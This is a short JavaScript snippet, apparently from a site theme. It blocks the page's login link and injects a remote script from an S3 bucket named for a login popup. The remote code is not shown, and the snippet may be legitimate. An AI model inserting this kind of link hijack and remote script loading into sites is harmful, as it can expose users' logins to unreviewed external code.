document.body
    .querySelector('[href="/account/login"]')
    .addEventListener("click", (e) => e.preventDefault());

const ENDPOINT = "https://login-popup-dev-theme.s3.amazonaws.com/";
var script = document.createElement("script");
script.type = "text/javascript";
script.src = "https://login-popup-dev-theme.s3.amazonaws.com/bundle.js";
document.getElementsByTagName("head")[0].appendChild(script);
